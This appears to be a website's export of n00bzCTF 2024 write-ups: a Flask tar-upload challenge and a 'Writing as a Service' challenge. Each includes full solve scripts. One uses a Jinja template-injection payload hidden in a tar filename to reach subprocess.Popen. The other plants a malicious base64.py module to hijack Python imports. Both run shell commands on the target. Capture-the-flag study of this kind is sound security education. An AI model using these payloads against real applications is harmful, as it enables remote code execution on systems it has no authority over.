[{"content":"File Sharing Portal Description: Welcome to the file sharing portal! We only support tar files!\nIntroduction The ctf has a very simple structure: we have a form in which we are asked to insert a tar file; once the tar file has been inserted, it is unzipped and we are shown the name of files it contains; by clicking on the different files, we can read their contents.\nSource The source has comments added later to allow a better understanding of the code in the writeups\n# filename: server.py #!/usr/bin/env python3 from flask import Flask, request, redirect, render_template, render_template_string import tarfile from hashlib import sha256 import os app = Flask(__name__) @app.route('/',methods=['GET','POST']) def main(): # This function mainly deals with loading the tar file into the server's file system. global username if request.method == 'GET': return render_template('index.html') elif request.method == 'POST': file = request.files['file'] if file.filename[-4:] != '.tar': # Check that the file passed is actually a tar file return render_template_string(\u0026quot;\u0026lt;p\u0026gt; We only support tar files as of right now!\u0026lt;/p\u0026gt;\u0026quot;) # Otherwise, it renders an error message name = sha256(os.urandom(16)).digest().hex() # Creates a random name that it will use to name our tar and the folder in the server's file system os.makedirs(f\u0026quot;./uploads/{name}\u0026quot;, exist_ok=True) # Create the directory file.save(f\u0026quot;./uploads/{name}/{name}.tar\u0026quot;) # Save the tar file try: # Extract the tar file tar_file = tarfile.TarFile(f'./uploads/{name}/{name}.tar') tar_file.extractall(path=f'./uploads/{name}/') return render_template_string(f\u0026quot;\u0026lt;p\u0026gt;Tar file extracted! View \u0026lt;a href='/view/{name}'\u0026gt;here\u0026lt;/a\u0026gt;\u0026quot;) except: return render_template_string(\u0026quot;\u0026lt;p\u0026gt;Failed to extract file!\u0026lt;/p\u0026gt;\u0026quot;) @app.route('/view/\u0026lt;name\u0026gt;') def view(name): # This function displays the files contained in the .tar file if not all([i in \u0026quot;abcdef1234567890\u0026quot; for i in name]): # Check that the file name is in hexadecimal, to avoid any kind of malicious input return render_template_string(\u0026quot;\u0026lt;p\u0026gt;Error!\u0026lt;/p\u0026gt;\u0026quot;) #print(os.popen(f'ls ./uploads/{name}').read()) #print(name) files = os.listdir(f\u0026quot;./uploads/{name}\u0026quot;) # List all files in the previously created folder out = '\u0026lt;h1\u0026gt;Files\u0026lt;/h1\u0026gt;\u0026lt;br\u0026gt;' files.remove(f'{name}.tar') # Remove the tar file from the list for i in files: out += f'\u0026lt;a href=\u0026quot;/read/{name}/{i}\u0026quot;\u0026gt;{i}\u0026lt;/a\u0026gt;' # Show via templates all file names # except: return render_template_string(out) # Render the template with the render_template_string function @app.route('/read/\u0026lt;name\u0026gt;/\u0026lt;file\u0026gt;') def read(name,file): # The function shows the contents of the single file if (not all([i in \u0026quot;abcdef1234567890\u0026quot; for i in name])): # Check that the file name is in hexadecimal, to avoid any kind of malicious input return render_template_string(\u0026quot;\u0026lt;p\u0026gt;Error!\u0026lt;/p\u0026gt;\u0026quot;) if ((\u0026quot;..\u0026quot; in name) or (\u0026quot;..\u0026quot; in file)) or ((\u0026quot;/\u0026quot; in file) or \u0026quot;/\u0026quot; in name): # Other controls to avoid path er return render_template_string(\u0026quot;\u0026lt;p\u0026gt;Error!\u0026lt;/p\u0026gt;\u0026quot;) f = open(f'./uploads/{name}/{file}') # Open the file data = f.read() f.close() return data # Return the content of file if __name__ == '__main__': app.run(host='0.0.0.0', port=1337) We can therefore see that there are several parameter checks, and at first one might think that the code is 100% safe.\nSolution The first thing that came to mind was to create a symbolic link to access the flag, and indeed this works (try with server.py), the problem is that the filename of the flag is unknown and this does not allow us to create a valid symbolic link.\nOnce we realised this, we did a thorough analysis of the code and came to the conclusion that the only thing that was not being checked was the name of the unpacked tar file allowing us to insert anything. By combining this with the \u0026lsquo;render_template_string\u0026rsquo; function (a vulnerable function of flask), it is possible to perform a template injection.\n# filename: exploit.py import requests import os import tarfile from bs4 import BeautifulSoup url = 'http://redacted.challs.n00bzunit3d.xyz:8080/' def create_tar(tar_name, file): with tarfile.open(tar_name, 'w') as tar: tar.add(file, arcname=os.path.basename(file)) print(f'Tar file created: {tar_name}') def create_payload(payload): with open(payload, 'w') as f: f.write('Remember to byte the cookies') create_tar('exploit.tar', payload) print(f'Payload created: {payload}') def get_url_view(text): soup = BeautifulSoup(text, 'html5lib') return [a['href'] for a in soup.find_all('a', href=True)][0] def leak_subprocess_index(): payload = \u0026quot;{{int.__class__.__base__.__subclasses__()}}\u0026quot; create_payload(payload) r = requests.post(url, files={'file': open('exploit.tar', 'rb')}) url_file = get_url_view(r.text) r = requests.get(url + url_file) text = r.text[r.text.index('[')+1:] list_classes = text.split(',') for i, c in enumerate(list_classes): if 'subprocess.Popen' in c: print(f'Index subprocess.Popen: {i}') return str(i) def get_flag(index): payload = \u0026quot;{{int.__class__.__base__.__subclasses__()[\u0026quot; + \\ index + \u0026quot;]('cat *', shell=True, stdout=-1).communicate()}}\u0026quot; create_payload(payload) r = requests.post(url, files={'file': open('exploit.tar', 'rb')}) url_file = get_url_view(r.text) r = requests.get(url + url_file) flag = r.text[r.text.index('n00bz{'):r.text.index('}')+1] print(f'Flag: {flag}') def main(): subprocess_index = leak_subprocess_index() get_flag(subprocess_index) if __name__ == '__main__': main() $ flag: n00bz{n3v3r_7rus71ng_t4r_4g41n!_b3506983087e} Author: akiidjk ","permalink":"http://localhost:37645/writeups/noobzctf/filesharingportal/","title":"File Sharing Portal"},{"content":"Waas Description: Writing as a Service!\nIntroduction WaaS (Writing as a Service) allows us to overwrite a file on the system (after some input validation) and insert anything (until a newline is met) we want in it.\nimport subprocess from base64 import b64decode as d while True: print(\u0026quot;[1] Write to a file\\n[2] Get the flag\\n[3] Exit\u0026quot;) try: inp = int(input(\u0026quot;Choice: \u0026quot;).strip()) except: print(\u0026quot;Invalid input!\u0026quot;) exit(0) if inp == 1: file = input(\u0026quot;Enter file name: \u0026quot;).strip() assert file.count('.') \u0026lt;= 2 # Why do you need more? assert \u0026quot;/proc\u0026quot; not in file # Why do you need to write there? assert \u0026quot;/bin\u0026quot; not in file # Why do you need to write there? assert \u0026quot;\\n\u0026quot; not in file # Why do you need these? assert \u0026quot;chall\u0026quot; not in file # Don't be overwriting my files! try: f = open(file,'w') except: print(\u0026quot;Error! Maybe the file does not exist?\u0026quot;) f.write(input(\u0026quot;Data: \u0026quot;).strip()) f.close() print(\u0026quot;Data written sucessfully!\u0026quot;) if inp == 2: flag = subprocess.run([\u0026quot;cat\u0026quot;,\u0026quot;fake_flag.txt\u0026quot;],capture_output=True) # You actually thought I would give the flag? print(flag.stdout.strip()) Solution At first one may think of trying to bypass the input validation to perhaps rewrite the workings of the cat command or the challenge file itself, but this isn\u0026rsquo;t possible. Something very bizarre is the imported but unused b64decode from the base64 module, which is what allows us to solve the challenge. When python imports modules it looks in sys.path, which has a list of valid directories to import modules from. After a quick scan through the python3 docs we find out that the first directory it looks through is the same directory the file is in, this means that if we have a base64.py file in the directory then python will try to import a b64decode symbol from that file instead of the common known module. One more feature of python\u0026rsquo;s import behavior we can use is the that all the code in an imported module will be executed. For example if a file test.py has print('Hello, World!') and it can be executed (for example if it\u0026rsquo;s at the lowest indentation level) then a file with import test will indeed see Hello, World! printed to stdout. Therefore, since the open function with a 'w' flag will create a file if it does not exist, we can simply create a file named base64.py and write our malicious code in it. Something like this will do the trick:\nimport os; b64decode = 0; os.system(\u0026quot;cat flag.txt\u0026quot;) But the flag isn\u0026rsquo;t our yet; we need to use the fact that the instance does not reset its files every time we connect to it, which means that our base64.py will remain in the directory for the lifetime of the instance. This means we simply need to reconnect to it and get our flag.\nsolve.py\nfrom pwn import * def solve(): r = remote('challs.n00bzunit3d.xyz', 10478) # PORT depends on the instance r.sendlineafter(b'Choice: ', b'1') # 1 to write a file r.sendlineafter(b'Enter file name: ', b'base64.py') r.sendlineafter(b'Data: ', b'import os; b64decode = 0; os.system(\u0026quot;cat flag.txt\u0026quot;)') r.close() r = remote('challs.n00bzunit3d.xyz', 10478) # PORT depends on the instance flag = r.recvline().decode() print(f'flag: {flag}') r.close() if __name__ == '__main__': solve() flag: n00bz{0v3rwr1t1ng_py7h0n3_m0dul3s?!!!_f5c63f47af0e} Author: vympel\n","permalink":"http://localhost:37645/writeups/noobzctf/waas/","title":"WaaS"},{"content":" N00bz CTF 2024 Description A 48 hours CTF hosted by n00bz for n00bz. Organized with beginner friendly challenges (and some hard ones), n00bzCTF is dedicated to make cyber security more friendly and approachable for complete n00bz.\nPerformance Summary CTFs: 31/32 Total point: 9794.000 Position: 24 Rating points: 24.067 Writeups Web File Sharing Portal Misc Waas ","permalink":"http://localhost:37645/writeups/n00bzctf/","title":"N00bzCTF"}]